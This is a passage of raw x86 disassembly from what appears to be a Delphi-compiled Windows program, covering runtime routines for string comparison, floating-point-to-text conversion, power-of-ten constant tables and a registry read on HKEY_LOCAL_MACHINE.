  4036f9:	31 f6                	xor    %esi,%esi
  4036fb:	89 32                	mov    %esi,(%edx)
  4036fd:	5f                   	pop    %edi
  4036fe:	5e                   	pop    %esi
  4036ff:	5b                   	pop    %ebx
  403700:	c3                   	ret
  403701:	8d 40 00             	lea    0x0(%eax),%eax
  403704:	56                   	push   %esi
  403705:	57                   	push   %edi
  403706:	89 c6                	mov    %eax,%esi
  403708:	89 d7                	mov    %edx,%edi
  40370a:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  403710:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  403712:	5f                   	pop    %edi
  403713:	5e                   	pop    %esi
  403714:	c3                   	ret
  403715:	8d 40 00             	lea    0x0(%eax),%eax
  403718:	53                   	push   %ebx
  403719:	31 db                	xor    %ebx,%ebx
  40371b:	57                   	push   %edi
  40371c:	89 d7                	mov    %edx,%edi
  40371e:	89 c1                	mov    %eax,%ecx
  403720:	83 ec 0a             	sub    $0xa,%esp
  403723:	c6 07 30             	movb   $0x30,(%edi)
  403726:	dc 8b 84 c0 41 00    	fmull  0x41c084(%ebx)
  40372c:	d9 fc                	frndint
  40372e:	dc 93 8c c0 41 00    	fcoml  0x41c08c(%ebx)
  403734:	9b df e0             	fstsw  %ax
  403737:	9e                   	sahf
  403738:	72 09                	jb     0x403743
  40373a:	dc a3 8c c0 41 00    	fsubl  0x41c08c(%ebx)
  403740:	c6 07 31             	movb   $0x31,(%edi)
  403743:	df 34 24             	fbstp  (%esp)
  403746:	ba 08 00 00 00       	mov    $0x8,%edx
  40374b:	47                   	inc    %edi
  40374c:	9b                   	fwait
  40374d:	8a 04 14             	mov    (%esp,%edx,1),%al
  403750:	88 c4                	mov    %al,%ah
  403752:	c0 e8 04             	shr    $0x4,%al
  403755:	80 e4 0f             	and    $0xf,%ah
  403758:	66 05 30 30          	add    $0x3030,%ax
  40375c:	66 ab                	stos   %ax,%es:(%edi)
  40375e:	4a                   	dec    %edx
  40375f:	79 eb                	jns    0x40374c
  403761:	83 e9 12             	sub    $0x12,%ecx
  403764:	7c 06                	jl     0x40376c
  403766:	b0 30                	mov    $0x30,%al
  403768:	f3 aa                	rep stos %al,%es:(%edi)
  40376a:	eb 14                	jmp    0x403780
  40376c:	01 cf                	add    %ecx,%edi
  40376e:	80 3f 35             	cmpb   $0x35,(%edi)
  403771:	7c 0d                	jl     0x403780
  403773:	4f                   	dec    %edi
  403774:	fe 07                	incb   (%edi)
  403776:	80 3f 39             	cmpb   $0x39,(%edi)
  403779:	7e 05                	jle    0x403780
  40377b:	c6 07 30             	movb   $0x30,(%edi)
  40377e:	eb f3                	jmp    0x403773
  403780:	83 c4 0a             	add    $0xa,%esp
  403783:	5f                   	pop    %edi
  403784:	5b                   	pop    %ebx
  403785:	c3                   	ret
  403786:	8b c0                	mov    %eax,%eax
  403788:	53                   	push   %ebx
  403789:	83 ec 0c             	sub    $0xc,%esp
  40378c:	31 db                	xor    %ebx,%ebx
  40378e:	d9 c0                	fld    %st(0)
  403790:	db 3c 24             	fstpt  (%esp)
  403793:	66 8b 44 24 08       	mov    0x8(%esp),%ax
  403798:	66 85 c0             	test   %ax,%ax
  40379b:	74 1b                	je     0x4037b8
  40379d:	66 2d ff 3f          	sub    $0x3fff,%ax
  4037a1:	66 ba 10 4d          	mov    $0x4d10,%dx
  4037a5:	66 f7 ea             	imul   %dx
  4037a8:	0f bf c2             	movswl %dx,%eax
  4037ab:	f7 d8                	neg    %eax
  4037ad:	74 16                	je     0x4037c5
  4037af:	29 c3                	sub    %eax,%ebx
  4037b1:	e8 da 01 00 00       	call   0x403990
  4037b6:	eb d6                	jmp    0x40378e
  4037b8:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4037bd:	75 de                	jne    0x40379d
  4037bf:	83 3c 24 00          	cmpl   $0x0,(%esp)
  4037c3:	75 d8                	jne    0x40379d
  4037c5:	83 c4 0c             	add    $0xc,%esp
  4037c8:	89 d8                	mov    %ebx,%eax
  4037ca:	5b                   	pop    %ebx
  4037cb:	c3                   	ret
  4037cc:	db 6c 24 04          	fldt   0x4(%esp)
  4037d0:	53                   	push   %ebx
  4037d1:	56                   	push   %esi
  4037d2:	57                   	push   %edi
  4037d3:	89 c3                	mov    %eax,%ebx
  4037d5:	89 d6                	mov    %edx,%esi
  4037d7:	51                   	push   %ecx
  4037d8:	81 ec 00 01 00 00    	sub    $0x100,%esp
  4037de:	81 fb ff 00 00 00    	cmp    $0xff,%ebx
  4037e4:	7e 05                	jle    0x4037eb
  4037e6:	bb ff 00 00 00       	mov    $0xff,%ebx
  4037eb:	d9 c0                	fld    %st(0)
  4037ed:	db 3c 24             	fstpt  (%esp)
  4037f0:	31 c0                	xor    %eax,%eax
  4037f2:	66 8b 44 24 08       	mov    0x8(%esp),%ax
  4037f7:	89 c7                	mov    %eax,%edi
  4037f9:	c1 ef 0f             	shr    $0xf,%edi
  4037fc:	66 25 ff 7f          	and    $0x7fff,%ax
  403800:	66 3d ff 7f          	cmp    $0x7fff,%ax
  403804:	0f 84 3e 01 00 00    	je     0x403948
  40380a:	d9 e1                	fabs
  40380c:	85 f6                	test   %esi,%esi
  40380e:	0f 8d a1 00 00 00    	jge    0x4038b5
  403814:	e8 6f ff ff ff       	call   0x403788
  403819:	89 de                	mov    %ebx,%esi
  40381b:	83 ee 08             	sub    $0x8,%esi
  40381e:	83 fe 02             	cmp    $0x2,%esi
  403821:	7d 07                	jge    0x40382a
  403823:	be 02 00 00 00       	mov    $0x2,%esi
  403828:	eb 0a                	jmp    0x403834
  40382a:	83 fe 12             	cmp    $0x12,%esi
  40382d:	7e 05                	jle    0x403834
  40382f:	be 12 00 00 00       	mov    $0x12,%esi
  403834:	89 e2                	mov    %esp,%edx
  403836:	50                   	push   %eax
  403837:	89 f0                	mov    %esi,%eax
  403839:	e8 da fe ff ff       	call   0x403718
  40383e:	89 fa                	mov    %edi,%edx
  403840:	8b bc 24 04 01 00 00 	mov    0x104(%esp),%edi
  403847:	88 1f                	mov    %bl,(%edi)
  403849:	47                   	inc    %edi
  40384a:	b0 20                	mov    $0x20,%al
  40384c:	89 d9                	mov    %ebx,%ecx
  40384e:	29 f1                	sub    %esi,%ecx
  403850:	83 e9 08             	sub    $0x8,%ecx
  403853:	7e 02                	jle    0x403857
  403855:	f3 aa                	rep stos %al,%es:(%edi)
  403857:	28 4f ff             	sub    %cl,-0x1(%edi)
  40385a:	84 d2                	test   %dl,%dl
  40385c:	74 02                	je     0x403860
  40385e:	b0 2d                	mov    $0x2d,%al
  403860:	aa                   	stos   %al,%es:(%edi)
  403861:	58                   	pop    %eax
  403862:	89 f1                	mov    %esi,%ecx
  403864:	89 e6                	mov    %esp,%esi
  403866:	80 3e 30             	cmpb   $0x30,(%esi)
  403869:	74 02                	je     0x40386d
  40386b:	40                   	inc    %eax
  40386c:	4e                   	dec    %esi
  40386d:	46                   	inc    %esi
  40386e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40386f:	c6 07 2e             	movb   $0x2e,(%edi)
  403872:	47                   	inc    %edi
  403873:	49                   	dec    %ecx
  403874:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403876:	c6 07 45             	movb   $0x45,(%edi)
  403879:	b1 2b                	mov    $0x2b,%cl
  40387b:	85 c0                	test   %eax,%eax
  40387d:	7d 04                	jge    0x403883
  40387f:	b1 2d                	mov    $0x2d,%cl
  403881:	f7 d8                	neg    %eax
  403883:	88 4f 01             	mov    %cl,0x1(%edi)
  403886:	31 d2                	xor    %edx,%edx
  403888:	66 b9 0a 00          	mov    $0xa,%cx
  40388c:	66 f7 f1             	div    %cx
  40388f:	80 c2 30             	add    $0x30,%dl
  403892:	88 57 05             	mov    %dl,0x5(%edi)
  403895:	31 d2                	xor    %edx,%edx
  403897:	66 f7 f1             	div    %cx
  40389a:	80 c2 30             	add    $0x30,%dl
  40389d:	88 57 04             	mov    %dl,0x4(%edi)
  4038a0:	31 d2                	xor    %edx,%edx
  4038a2:	66 f7 f1             	div    %cx
  4038a5:	80 c2 30             	add    $0x30,%dl
  4038a8:	88 57 03             	mov    %dl,0x3(%edi)
  4038ab:	04 30                	add    $0x30,%al
  4038ad:	88 47 02             	mov    %al,0x2(%edi)
  4038b0:	e9 86 00 00 00       	jmp    0x40393b
  4038b5:	81 fe d8 00 00 00    	cmp    $0xd8,%esi
  4038bb:	7e 05                	jle    0x4038c2
  4038bd:	be d8 00 00 00       	mov    $0xd8,%esi
  4038c2:	dc 15 94 c0 41 00    	fcoml  0x41c094
  4038c8:	9b df e0             	fstsw  %ax
  4038cb:	9e                   	sahf
  4038cc:	b8 00 00 00 00       	mov    $0x0,%eax
  4038d1:	72 0e                	jb     0x4038e1
  4038d3:	e8 b0 fe ff ff       	call   0x403788
  4038d8:	83 f8 23             	cmp    $0x23,%eax
  4038db:	0f 8f 38 ff ff ff    	jg     0x403819
  4038e1:	40                   	inc    %eax
  4038e2:	89 e2                	mov    %esp,%edx
  4038e4:	50                   	push   %eax
  4038e5:	01 f0                	add    %esi,%eax
  4038e7:	e8 2c fe ff ff       	call   0x403718
  4038ec:	58                   	pop    %eax
  4038ed:	89 f2                	mov    %esi,%edx
  4038ef:	89 e6                	mov    %esp,%esi
  4038f1:	80 3e 30             	cmpb   $0x30,(%esi)
  4038f4:	74 02                	je     0x4038f8
  4038f6:	40                   	inc    %eax
  4038f7:	4e                   	dec    %esi
  4038f8:	46                   	inc    %esi
  4038f9:	89 c1                	mov    %eax,%ecx
  4038fb:	01 f9                	add    %edi,%ecx
  4038fd:	85 d2                	test   %edx,%edx
  4038ff:	74 09                	je     0x40390a
  403901:	41                   	inc    %ecx
  403902:	01 d1                	add    %edx,%ecx
  403904:	39 cb                	cmp    %ecx,%ebx
  403906:	7f 02                	jg     0x40390a
  403908:	89 cb                	mov    %ecx,%ebx
  40390a:	50                   	push   %eax
  40390b:	57                   	push   %edi
  40390c:	8b bc 24 08 01 00 00 	mov    0x108(%esp),%edi
  403913:	88 1f                	mov    %bl,(%edi)
  403915:	47                   	inc    %edi
  403916:	29 cb                	sub    %ecx,%ebx
  403918:	89 d9                	mov    %ebx,%ecx
  40391a:	7e 04                	jle    0x403920
  40391c:	b0 20                	mov    $0x20,%al
  40391e:	f3 aa                	rep stos %al,%es:(%edi)
  403920:	28 4f ff             	sub    %cl,-0x1(%edi)
  403923:	58                   	pop    %eax
  403924:	59                   	pop    %ecx
  403925:	85 c0                	test   %eax,%eax
  403927:	74 04                	je     0x40392d
  403929:	c6 07 2d             	movb   $0x2d,(%edi)
  40392c:	47                   	inc    %edi
  40392d:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40392f:	85 d2                	test   %edx,%edx
  403931:	74 08                	je     0x40393b
  403933:	c6 07 2e             	movb   $0x2e,(%edi)
  403936:	47                   	inc    %edi
  403937:	89 d1                	mov    %edx,%ecx
  403939:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40393b:	81 c4 00 01 00 00    	add    $0x100,%esp
  403941:	59                   	pop    %ecx
  403942:	5f                   	pop    %edi
  403943:	5e                   	pop    %esi
  403944:	5b                   	pop    %ebx
  403945:	c2 0c 00             	ret    $0xc
  403948:	31 c0                	xor    %eax,%eax
  40394a:	dd d8                	fstp   %st(0)
  40394c:	81 7c 24 04 00 00 00 	cmpl   $0x80000000,0x4(%esp)
  403953:	80 
  403954:	8d b0 9c c0 41 00    	lea    0x41c09c(%eax),%esi
  40395a:	75 0f                	jne    0x40396b
  40395c:	4f                   	dec    %edi
  40395d:	8d b0 a0 c0 41 00    	lea    0x41c0a0(%eax),%esi
  403963:	75 06                	jne    0x40396b
  403965:	8d b0 a8 c0 41 00    	lea    0x41c0a8(%eax),%esi
  40396b:	89 cf                	mov    %ecx,%edi
  40396d:	89 d9                	mov    %ebx,%ecx
  40396f:	88 0f                	mov    %cl,(%edi)
  403971:	47                   	inc    %edi
  403972:	2a 0e                	sub    (%esi),%cl
  403974:	76 04                	jbe    0x40397a
  403976:	b0 20                	mov    $0x20,%al
  403978:	f3 aa                	rep stos %al,%es:(%edi)
  40397a:	28 4f ff             	sub    %cl,-0x1(%edi)
  40397d:	8a 0e                	mov    (%esi),%cl
  40397f:	46                   	inc    %esi
  403980:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  403982:	eb b7                	jmp    0x40393b
  403984:	c3                   	ret
  403985:	8d 40 00             	lea    0x0(%eax),%eax
  403988:	e9 03 00 00 00       	jmp    0x403990
  40398d:	c3                   	ret
  40398e:	8b c0                	mov    %eax,%eax
  403990:	53                   	push   %ebx
  403991:	31 db                	xor    %ebx,%ebx
  403993:	85 c0                	test   %eax,%eax
  403995:	7c 4d                	jl     0x4039e4
  403997:	0f 84 9a 00 00 00    	je     0x403a37
  40399d:	3d 00 14 00 00       	cmp    $0x1400,%eax
  4039a2:	0f 8d 81 00 00 00    	jge    0x403a29
  4039a8:	89 c2                	mov    %eax,%edx
  4039aa:	83 e2 1f             	and    $0x1f,%edx
  4039ad:	8d 14 92             	lea    (%edx,%edx,4),%edx
  4039b0:	db ac 53 43 3a 40 00 	fldt   0x403a43(%ebx,%edx,2)
  4039b7:	de c9                	fmulp  %st,%st(1)
  4039b9:	c1 e8 05             	shr    $0x5,%eax
  4039bc:	74 79                	je     0x403a37
  4039be:	89 c2                	mov    %eax,%edx
  4039c0:	83 e2 0f             	and    $0xf,%edx
  4039c3:	74 0c                	je     0x4039d1
  4039c5:	8d 14 92             	lea    (%edx,%edx,4),%edx
  4039c8:	db ac 53 79 3b 40 00 	fldt   0x403b79(%ebx,%edx,2)
  4039cf:	de c9                	fmulp  %st,%st(1)
  4039d1:	c1 e8 04             	shr    $0x4,%eax
  4039d4:	74 61                	je     0x403a37
  4039d6:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4039d9:	db ac 43 0f 3c 40 00 	fldt   0x403c0f(%ebx,%eax,2)
  4039e0:	de c9                	fmulp  %st,%st(1)
  4039e2:	eb 53                	jmp    0x403a37
  4039e4:	f7 d8                	neg    %eax
  4039e6:	3d 00 14 00 00       	cmp    $0x1400,%eax
  4039eb:	7d 46                	jge    0x403a33
  4039ed:	89 c2                	mov    %eax,%edx
  4039ef:	83 e2 1f             	and    $0x1f,%edx
  4039f2:	8d 14 92             	lea    (%edx,%edx,4),%edx
  4039f5:	db ac 53 43 3a 40 00 	fldt   0x403a43(%ebx,%edx,2)
  4039fc:	de f9                	fdivrp %st,%st(1)
  4039fe:	c1 e8 05             	shr    $0x5,%eax
  403a01:	74 34                	je     0x403a37
  403a03:	89 c2                	mov    %eax,%edx
  403a05:	83 e2 0f             	and    $0xf,%edx
  403a08:	74 0c                	je     0x403a16
  403a0a:	8d 14 92             	lea    (%edx,%edx,4),%edx
  403a0d:	db ac 53 79 3b 40 00 	fldt   0x403b79(%ebx,%edx,2)
  403a14:	de f9                	fdivrp %st,%st(1)
  403a16:	c1 e8 04             	shr    $0x4,%eax
  403a19:	74 1c                	je     0x403a37
  403a1b:	8d 04 80             	lea    (%eax,%eax,4),%eax
  403a1e:	db ac 43 0f 3c 40 00 	fldt   0x403c0f(%ebx,%eax,2)
  403a25:	de f9                	fdivrp %st,%st(1)
  403a27:	eb 0e                	jmp    0x403a37
  403a29:	dd d8                	fstp   %st(0)
  403a2b:	db ab 39 3a 40 00    	fldt   0x403a39(%ebx)
  403a31:	eb 04                	jmp    0x403a37
  403a33:	dd d8                	fstp   %st(0)
  403a35:	d9 ee                	fldz
  403a37:	5b                   	pop    %ebx
  403a38:	c3                   	ret
  403a39:	00 00                	add    %al,(%eax)
  403a3b:	00 00                	add    %al,(%eax)
  403a3d:	00 00                	add    %al,(%eax)
  403a3f:	00 80 ff 7f 00 00    	add    %al,0x7fff(%eax)
  403a45:	00 00                	add    %al,(%eax)
  403a47:	00 00                	add    %al,(%eax)
  403a49:	00 80 ff 3f 00 00    	add    %al,0x3fff(%eax)
  403a4f:	00 00                	add    %al,(%eax)
  403a51:	00 00                	add    %al,(%eax)
  403a53:	00 a0 02 40 00 00    	add    %ah,0x4002(%eax)
  403a59:	00 00                	add    %al,(%eax)
  403a5b:	00 00                	add    %al,(%eax)
  403a5d:	00 c8                	add    %cl,%al
  403a5f:	05 40 00 00 00       	add    $0x40,%eax
  403a64:	00 00                	add    %al,(%eax)
  403a66:	00 00                	add    %al,(%eax)
  403a68:	fa                   	cli
  403a69:	08 40 00             	or     %al,0x0(%eax)
  403a6c:	00 00                	add    %al,(%eax)
  403a6e:	00 00                	add    %al,(%eax)
  403a70:	00 40 9c             	add    %al,-0x64(%eax)
  403a73:	0c 40                	or     $0x40,%al
  403a75:	00 00                	add    %al,(%eax)
  403a77:	00 00                	add    %al,(%eax)
  403a79:	00 00                	add    %al,(%eax)
  403a7b:	50                   	push   %eax
  403a7c:	c3                   	ret
  403a7d:	0f 40 00             	cmovo  (%eax),%eax
  403a80:	00 00                	add    %al,(%eax)
  403a82:	00 00                	add    %al,(%eax)
  403a84:	00 24 f4             	add    %ah,(%esp,%esi,8)
  403a87:	12 40 00             	adc    0x0(%eax),%al
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	00 00                	add    %al,(%eax)
  403a8e:	80 96 98 16 40 00 00 	adcb   $0x0,0x401698(%esi)
  403a95:	00 00                	add    %al,(%eax)
  403a97:	00 20                	add    %ah,(%eax)
  403a99:	bc be 19 40 00       	mov    $0x4019be,%esp
  403a9e:	00 00                	add    %al,(%eax)
  403aa0:	00 00                	add    %al,(%eax)
  403aa2:	28 6b ee             	sub    %ch,-0x12(%ebx)
  403aa5:	1c 40                	sbb    $0x40,%al
  403aa7:	00 00                	add    %al,(%eax)
  403aa9:	00 00                	add    %al,(%eax)
  403aab:	00 f9                	add    %bh,%cl
  403aad:	02 95 20 40 00 00    	add    0x4020(%ebp),%dl
  403ab3:	00 00                	add    %al,(%eax)
  403ab5:	40                   	inc    %eax
  403ab6:	b7 43                	mov    $0x43,%bh
  403ab8:	ba 23 40 00 00       	mov    $0x4023,%edx
  403abd:	00 00                	add    %al,(%eax)
  403abf:	10 a5 d4 e8 26 40    	adc    %ah,0x4026e8d4(%ebp)
  403ac5:	00 00                	add    %al,(%eax)
  403ac7:	00 00                	add    %al,(%eax)
  403ac9:	2a e7                	sub    %bh,%ah
  403acb:	84 91 2a 40 00 00    	test   %dl,0x402a(%ecx)
  403ad1:	00 80 f4 20 e6 b5    	add    %al,-0x4a19df0c(%eax)
  403ad7:	2d 40 00 00 00       	sub    $0x40,%eax
  403adc:	a0 31 a9 5f e3       	mov    0xe35fa931,%al
  403ae1:	30 40 00             	xor    %al,0x0(%eax)
  403ae4:	00 00                	add    %al,(%eax)
  403ae6:	04 bf                	add    $0xbf,%al
  403ae8:	c9                   	leave
  403ae9:	1b 8e 34 40 00 00    	sbb    0x4034(%esi),%ecx
  403aef:	00 c5                	add    %al,%ch
  403af1:	2e bc a2 b1 37 40    	cs mov $0x4037b1a2,%esp
  403af7:	00 00                	add    %al,(%eax)
  403af9:	40                   	inc    %eax
  403afa:	76 3a                	jbe    0x403b36
  403afc:	6b 0b de             	imul   $0xffffffde,(%ebx),%ecx
  403aff:	3a 40 00             	cmp    0x0(%eax),%al
  403b02:	00 e8                	add    %ch,%al
  403b04:	89 04 23             	mov    %eax,(%ebx,%eiz,1)
  403b07:	c7                   	(bad)
  403b08:	8a 3e                	mov    (%esi),%bh
  403b0a:	40                   	inc    %eax
  403b0b:	00 00                	add    %al,(%eax)
  403b0d:	62 ac c5 eb 78 ad 41 	bound  %ebp,0x41ad78eb(%ebp,%eax,8)
  403b14:	40                   	inc    %eax
  403b15:	00 80 7a 17 b7 26    	add    %al,0x26b7177a(%eax)
  403b1b:	d7                   	xlat   %ds:(%ebx)
  403b1c:	d8 44 40 00          	fadds  0x0(%eax,%eax,2)
  403b20:	90                   	nop
  403b21:	ac                   	lods   %ds:(%esi),%al
  403b22:	6e                   	outsb  %ds:(%esi),(%dx)
  403b23:	32 78 86             	xor    -0x7a(%eax),%bh
  403b26:	87 48 40             	xchg   %ecx,0x40(%eax)
  403b29:	00 b4 57 0a 3f 16 68 	add    %dh,0x68163f0a(%edi,%edx,2)
  403b30:	a9 4b 40 00 a1       	test   $0xa100404b,%eax
  403b35:	ed                   	in     (%dx),%eax
  403b36:	cc                   	int3
  403b37:	ce                   	into
  403b38:	1b c2                	sbb    %edx,%eax
  403b3a:	d3 4e 40             	rorl   %cl,0x40(%esi)
  403b3d:	a0 84 14 40 61       	mov    0x61401484,%al
  403b42:	51                   	push   %ecx
  403b43:	59                   	pop    %ecx
  403b44:	84 52 40             	test   %dl,0x40(%edx)
  403b47:	c8 a5 19 90          	enter  $0x19a5,$0x90
  403b4b:	b9 a5 6f a5 55       	mov    $0x55a56fa5,%ecx
  403b50:	40                   	inc    %eax
  403b51:	3a 0f                	cmp    (%edi),%cl
  403b53:	20 f4                	and    %dh,%ah
  403b55:	27                   	daa
  403b56:	8f                   	(bad)
  403b57:	cb                   	lret
  403b58:	ce                   	into
  403b59:	58                   	pop    %eax
  403b5a:	40                   	inc    %eax
  403b5b:	84 09                	test   %cl,(%ecx)
  403b5d:	94                   	xchg   %eax,%esp
  403b5e:	f8                   	clc
  403b5f:	78 39                	js     0x403b9a
  403b61:	3f                   	aas
  403b62:	81 5c 40 e5 0b b9 36 	sbbl   $0xd736b90b,-0x1b(%eax,%eax,2)
  403b69:	d7 
  403b6a:	07                   	pop    %es
  403b6b:	8f                   	(bad)
  403b6c:	a1 5f 40 df 4e       	mov    0x4edf405f,%eax
  403b71:	67 04 cd             	addr16 add $0xcd,%al
  403b74:	c9                   	leave
  403b75:	f2 c9                	repnz leave
  403b77:	62 40 96             	bound  %eax,-0x6a(%eax)
  403b7a:	22 81 45 40 7c 6f    	and    0x6f7c4045(%ecx),%al
  403b80:	fc                   	cld
  403b81:	65 40                	gs inc %eax
  403b83:	9e                   	sahf
  403b84:	b5 70                	mov    $0x70,%ch
  403b86:	2b a8 ad c5 9d 69    	sub    0x699dc5ad(%eax),%ebp
  403b8c:	40                   	inc    %eax
  403b8d:	d5 a6                	aad    $0xa6
  403b8f:	cf                   	iret
  403b90:	ff 49 1f             	decl   0x1f(%ecx)
  403b93:	78 c2                	js     0x403b57
  403b95:	d3 40 a3             	roll   %cl,-0x5d(%eax)
  403b98:	14 9b                	adc    $0x9b,%al
  403b9a:	c5 16                	lds    (%esi),%edx
  403b9c:	ab                   	stos   %eax,%es:(%edi)
  403b9d:	b3 ef                	mov    $0xef,%bl
  403b9f:	3d 41 e0 8c e9       	cmp    $0xe98ce041,%eax
  403ba4:	80 c9 47             	or     $0x47,%cl
  403ba7:	ba 93 a8 41 aa       	mov    $0xaa41a893,%edx
  403bac:	17                   	pop    %ss
  403bad:	e6 7f                	out    %al,$0x7f
  403baf:	2b a1 16 b6 12 42    	sub    0x4212b616(%ecx),%esp
  403bb5:	6b 55 27 39          	imul   $0x39,0x27(%ebp),%edx
  403bb9:	8d                   	lea    (bad),%esi
  403bba:	f7 70 e0             	divl   -0x20(%eax)
  403bbd:	7c 42                	jl     0x403c01
  403bbf:	30 c9                	xor    %cl,%cl
  403bc1:	3c e3                	cmp    $0xe3,%al
  403bc3:	ff 96 52 8a e7 42    	call   *0x42e78a52(%esi)
  403bc9:	8e de                	mov    %esi,%ds
  403bcb:	f9                   	stc
  403bcc:	9d                   	popf
  403bcd:	fb                   	sti
  403bce:	eb 7e                	jmp    0x403c4e
  403bd0:	aa                   	stos   %al,%es:(%edi)
  403bd1:	51                   	push   %ecx
  403bd2:	43                   	inc    %ebx
  403bd3:	8c 2f                	mov    %gs,(%edi)
  403bd5:	6a 5c                	push   $0x5c
  403bd7:	19 fc                	sbb    %edi,%esp
  403bd9:	26 d2 bb 43 76 e3 cc 	sarb   %cl,%es:-0x331c89bd(%ebx)
  403be0:	f2 29 2f             	repnz sub %ebp,(%edi)
  403be3:	84 81 26 44 d2 0a    	test   %al,0xad24426(%ecx)
  403be9:	90                   	nop
  403bea:	db 00                	fildl  (%eax)
  403bec:	27                   	daa
  403bed:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403bee:	9f                   	lahf
  403bef:	90                   	nop
  403bf0:	44                   	inc    %esp
  403bf1:	17                   	pop    %ss
  403bf2:	aa                   	stos   %al,%es:(%edi)
  403bf3:	f8                   	clc
  403bf4:	ae                   	scas   %es:(%edi),%al
  403bf5:	10 e3                	adc    %ah,%bl
  403bf7:	c5 c4 fa             	(bad)
  403bfa:	44                   	inc    %esp
  403bfb:	59                   	pop    %ecx
  403bfc:	9c                   	pushf
  403bfd:	b0 e9                	mov    $0xe9,%al
  403bff:	07                   	pop    %es
  403c00:	9c                   	pushf
  403c01:	8a f2                	mov    %dl,%dh
  403c03:	64 45                	fs inc %ebp
  403c05:	d4 f3                	aam    $0xf3
  403c07:	f7 eb                	imul   %ebx
  403c09:	e1 4a                	loope  0x403c55
  403c0b:	7a 95                	jp     0x403ba2
  403c0d:	cf                   	iret
  403c0e:	45                   	inc    %ebp
  403c0f:	62 a2 95 07 dc d8    	bound  %esp,-0x2723f86b(%edx)
  403c15:	3e b8 39 46 c7 91    	ds mov $0x91c74639,%eax
  403c1b:	0e                   	push   %cs
  403c1c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403c1d:	ae                   	scas   %es:(%edi),%al
  403c1e:	a0 19 e3 a3 46       	mov    0x46a3e319,%al
  403c23:	17                   	pop    %ss
  403c24:	0c 75                	or     $0x75,%al
  403c26:	81 86 75 76 c9 48 4d 	addl   $0x93a7e44d,0x48c97675(%esi)
  403c2d:	e4 a7 93 
  403c30:	39 3b                	cmp    %edi,(%ebx)
  403c32:	35 b8 b2 ed 53       	xor    $0x53edb2b8,%eax
  403c37:	e5 5d                	in     $0x5d,%eax
  403c39:	3d c5 5d 3b 8b       	cmp    $0x8b3b5dc5,%eax
  403c3e:	9e                   	sahf
  403c3f:	92                   	xchg   %eax,%edx
  403c40:	5a                   	pop    %edx
  403c41:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  403c42:	f0 a1 20 c0 54 a5    	lock mov 0xa554c020,%eax
  403c48:	8c 37                	mov    %?,(%edi)
  403c4a:	61                   	popa
  403c4b:	8b 5a 8b             	mov    -0x75(%edx),%ebx
  403c4e:	d8 25 5d 89 f9 db    	fsubs  0xdbf9895d
  403c54:	67 f8                	addr16 clc
  403c56:	f3 27                	repz daa
  403c58:	bf a2 c8 5d dd       	mov    $0xdd5dc8a2,%edi
  403c5d:	80 6e 9b 97          	subb   $0x97,-0x65(%esi)
  403c61:	20 8a 02 52 60 c4    	and    %cl,-0x3b9fadfe(%edx)
  403c67:	25 75 f0 59 d5       	and    $0xd559f075,%eax
  403c6c:	6e                   	outsb  %ds:(%esi),(%dx)
  403c6d:	62 11                	bound  %edx,(%ecx)
  403c6f:	35 ae ca 7b c3       	xor    $0xc37bcaae,%eax
  403c74:	ff 25 b8 f1 e1 00    	jmp    *0xe1f1b8
  403c7a:	8b c0                	mov    %eax,%eax
  403c7c:	53                   	push   %ebx
  403c7d:	33 db                	xor    %ebx,%ebx
  403c7f:	6a 00                	push   $0x0
  403c81:	e8 ee ff ff ff       	call   0x403c74
  403c86:	83 f8 07             	cmp    $0x7,%eax
  403c89:	75 1c                	jne    0x403ca7
  403c8b:	6a 01                	push   $0x1
  403c8d:	e8 e2 ff ff ff       	call   0x403c74
  403c92:	25 00 ff 00 00       	and    $0xff00,%eax
  403c97:	3d 00 0d 00 00       	cmp    $0xd00,%eax
  403c9c:	74 07                	je     0x403ca5
  403c9e:	3d 00 04 00 00       	cmp    $0x400,%eax
  403ca3:	75 02                	jne    0x403ca7
  403ca5:	b3 01                	mov    $0x1,%bl
  403ca7:	8b c3                	mov    %ebx,%eax
  403ca9:	5b                   	pop    %ebx
  403caa:	c3                   	ret
  403cab:	90                   	nop
  403cac:	55                   	push   %ebp
  403cad:	8b ec                	mov    %esp,%ebp
  403caf:	83 c4 f4             	add    $0xfffffff4,%esp
  403cb2:	0f b7 05 20 c0 41 00 	movzwl 0x41c020,%eax
  403cb9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403cbc:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403cbf:	50                   	push   %eax
  403cc0:	6a 01                	push   $0x1
  403cc2:	6a 00                	push   $0x0
  403cc4:	68 44 3d 40 00       	push   $0x403d44
  403cc9:	68 02 00 00 80       	push   $0x80000002
  403cce:	e8 95 d5 ff ff       	call   0x401268
  403cd3:	85 c0                	test   %eax,%eax
  403cd5:	75 4d                	jne    0x403d24
  403cd7:	33 c0                	xor    %eax,%eax
  403cd9:	55                   	push   %ebp
  403cda:	68 1d 3d 40 00       	push   $0x403d1d
  403cdf:	64 ff 30             	push   %fs:(%eax)
  403ce2:	64 89 20             	mov    %esp,%fs:(%eax)
  403ce5:	c7 45 f4 04 00 00 00 	movl   $0x4,-0xc(%ebp)
  403cec:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403cef:	50                   	push   %eax
  403cf0:	8d 45 f8             	lea    -0x8(%ebp),%eax
  403cf3:	50                   	push   %eax
  403cf4:	6a 00                	push   $0x0
  403cf6:	6a 00                	push   $0x0
  403cf8:	68 60 3d 40 00       	push   $0x403d60
  403cfd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403d00:	50                   	push   %eax
  403d01:	e8 6a d5 ff ff       	call   0x401270
  403d06:	33 c0                	xor    %eax,%eax
  403d08:	5a                   	pop    %edx
  403d09:	59                   	pop    %ecx
  403d0a:	59                   	pop    %ecx
  403d0b:	64 89 10             	mov    %edx,%fs:(%eax)
  403d0e:	68 24 3d 40 00       	push   $0x403d24
